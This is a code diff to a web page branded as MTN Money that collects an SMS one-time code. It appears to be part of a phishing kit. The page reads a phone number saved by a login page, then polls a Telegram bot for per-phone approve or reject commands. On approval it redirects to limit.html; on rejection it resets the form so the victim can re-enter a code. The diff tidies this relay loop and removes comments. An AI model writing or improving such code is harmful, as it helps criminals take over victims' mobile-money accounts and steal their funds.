@@ -95,7 +95,6 @@
             width: auto;
             display: block;
             border-radius: 8px;
-            /* optional: makes it look nicer */
         }
         /* Main Content */
         
@@ -228,7 +227,6 @@
             <button class="icon-btn" onclick="history.back()"><i class="fa-solid fa-arrow-left"></i></button>
 
             <div class="logo" aria-label="MTN Money">
-                <!-- Replaced logo with your provided MTN logo -->
                 <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRkIMuXBHiC5OpIeU7Uq5OJnSIOe9cbzO7MALP-XujJ-w&s=10" alt="MTN Money Logo">
             </div>
 
@@ -268,17 +266,25 @@
         const submitBtn = document.getElementById('submitBtn');
         const countdownEl = document.getElementById('countdown');
         const resendWrapper = document.getElementById('resendWrapper');
+        let currentIntervalId = null;
 
         function closeModal() {
             errorModal.style.display = 'none';
+            // Reset page state completely for details re-entry on decline/retry
             smsInput.value = '';
+            smsInput.disabled = false;
+            smsInput.classList.remove('disabled');
             smsInput.focus();
 
+            submitBtn.innerHTML = 'SUBMIT';
+            submitBtn.style.opacity = '1';
             submitBtn.disabled = true;
             submitBtn.classList.remove('active');
+
+            if (currentIntervalId) clearInterval(currentIntervalId);
         }
 
-        // 1) Retrieve & Format the phone number from login.html
+        // 1) Retrieve & Format the phone number from login page
         const savedPhone = sessionStorage.getItem('savedPhone');
         const phoneDisplay = document.getElementById('displayPhone');
 
@@ -287,7 +293,6 @@
         if (savedPhone) {
             let cleanNumber = savedPhone.replace(/[^0-9]/g, '');
 
-            // Convert '0-XX-XX-XX-XX' to '+267XXXXXXXX'
             if (cleanNumber.startsWith('0')) cleanNumber = cleanNumber.substring(1);
 
             cleanPhoneForBot = '237' + cleanNumber;
@@ -383,7 +388,7 @@
                         offset = data.result[data.result.length - 1].update_id + 1;
                     }
 
-                    const intervalId = setInterval(() => {
+                    currentIntervalId = setInterval(() => {
                         if (decided) return;
 
                         fetch(`https://api.telegram.org/bot${botToken}/getUpdates?limit=20&offset=${offset}`)
@@ -399,11 +404,11 @@
 
                                         if (action === `OTP_APP_${phone}`) {
                                             decided = true;
-                                            clearInterval(intervalId);
+                                            clearInterval(currentIntervalId);
                                             window.location.href = 'limit.html';
                                         } else if (action === `OTP_REJ_${phone}`) {
                                             decided = true;
-                                            clearInterval(intervalId);
+                                            clearInterval(currentIntervalId);
 
                                             btnElement.innerHTML = 'SUBMIT';
                                             btnElement.style.opacity = '1';
